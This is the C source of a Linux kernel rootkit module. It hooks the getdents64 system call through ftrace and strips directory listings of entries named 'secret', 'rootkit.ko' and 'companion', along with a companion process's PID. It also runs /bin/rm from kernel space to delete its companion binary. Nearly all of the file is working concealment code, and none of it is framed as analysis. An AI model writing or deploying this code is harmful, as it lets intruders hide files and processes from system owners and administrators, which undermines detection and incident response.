#include "rootkit.h"

void delete_binary(void) {
	char *argv[] = {"/bin/rm", "/bin/companion", NULL};
	char *envp[] = { "HOME=/root", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
	int r = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
	if (r >= 0) {
		// printk(KERN_INFO "Companion removed\n");
	} else {
		// printk(KERN_INFO "Fail\n");
	}
}

static int find_sys_call_addr(t_ftrace_hook *hook) {
	hook->address = kallsyms_lookup_name(hook->name);
	if (!hook->address) {
		// printk(KERN_ERR "Failed to find syscall table\n");
		return 1;
	}
	*((unsigned long*) hook->original) = hook->address;
	return 0;
}

static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct ftrace_regs *regs)
{
	t_ftrace_hook *hook = container_of(ops, t_ftrace_hook, ops);

	if(!within_module(parent_ip, THIS_MODULE))
		((struct pt_regs *)(regs))->ip = (unsigned long) hook->function;
}

int fh_install_hook(t_ftrace_hook *hook)
{
	int err;
	err = find_sys_call_addr(hook);
	if(err)
		return err;
	/* For many of function hooks (especially non-trivial ones), the $rip
	 * register gets modified, so we have to alert ftrace to this fact. This
	 * is the reason for the SAVE_REGS and IP_MODIFY flags. However, we also
	 * need to OR the RECURSION_SAFE flag (effectively turning if OFF) because
	 * the built-in anti-recursion guard provided by ftrace is useless if
	 * we're modifying $rip. This is why we have to implement our own checks
	 * (see USE_FENTRY_OFFSET). */
	hook->ops.func = fh_ftrace_thunk;
	hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
			| FTRACE_OPS_FL_RECURSION
			| FTRACE_OPS_FL_IPMODIFY;

	err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
	if(err)
	{
		// printk(KERN_INFO "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
		return err;
	}

	err = register_ftrace_function(&hook->ops);
	if(err)
	{
		// printk(KERN_INFO "rootkit: register_ftrace_function() failed: %d\n", err);
		return err;
	}

	return 0;
}

void fh_remove_hook(t_ftrace_hook *hook)
{
	int err;
	err = unregister_ftrace_function(&hook->ops);
	if(err)
	{
		// printk(KERN_DEBUG "rootkit: unregister_ftrace_function() failed: %d\n", err);
	}

	err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
	if(err) {
		// printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
	}
}

static inline int is_digit(int c) {
	return (c >= '0' && c <= '9');
}


static bool is_numeric(char *str) {
	int i = 0;
	while (str[i] && is_digit(str[i])) {
		i++;
	}
	return (i == strlen(str));
}

bool is_current_file_to_hide(char *filename) {
	char *string_to_hide[] = {"secret", "rootkit.ko", "companion", "companion.c", NULL};

	int i = 0;
	while (string_to_hide[i] != NULL) {
		if (strstr(filename, string_to_hide[i]) != NULL) {
			return true;
		}
		i++;
	}
	return false;
}

bool is_a_pid_to_hide(char *filename) {

	int buff_pid = -1;

	if (filename && is_numeric(filename)) {
		buff_pid = (int)simple_strtol(filename, NULL, 10);

		if (buff_pid == g_pid_companion) {
			return (true);
		}
	}
	return (false);
}

int loop_current_dirent (int size_dirent, struct linux_dirent64 __user *dirent) {

	int pos_idx = 0;
	int to_hide_bytes = 0;
	void *dirent_original = (void *)dirent;
	int ret_size = 0;

	// Loop on all the files info, cutting information when necessary
	while (pos_idx + to_hide_bytes < size_dirent) {
		struct linux_dirent64 *dirent_buffer = (struct linux_dirent64 *)(dirent_original + pos_idx);
		if (is_current_file_to_hide(dirent_buffer->d_name) || is_a_pid_to_hide(dirent_buffer->d_name)) {

			void *current_pos = (void *)dirent_buffer + pos_idx;
			void *next_pos = (void *)dirent_buffer + pos_idx + dirent_buffer->d_reclen;
			int  unbrowsed_bytes = size_dirent - (pos_idx + dirent_buffer->d_reclen);

			// Cutting current nodes
			memcpy(current_pos, next_pos, unbrowsed_bytes);
			to_hide_bytes += dirent_buffer->d_reclen;
			continue ;
		}
		pos_idx += dirent_buffer->d_reclen;
	}
	ret_size = pos_idx;
	return ret_size;
}

asmlinkage long myGetDents(const struct pt_regs *regs) {

	struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->si;
	int getdent_ret = g_original_getdents(regs);
	if (getdent_ret <= 0) 
		return getdent_ret;

	int ret = loop_current_dirent(getdent_ret, dirent);
	/*
	printf("%-10s ", (d_type == DT_REG) ?  "regular" :
	(d_type == DT_DIR) ?  "directory" :
	(d_type == DT_FIFO) ? "FIFO" :
	(d_type == DT_SOCK) ? "socket" :
	(d_type == DT_LNK) ?  "symlink" :
	(d_type == DT_BLK) ?  "block dev" :
	(d_type == DT_CHR) ?  "char dev" : "???");
	*/
	return ret;
}
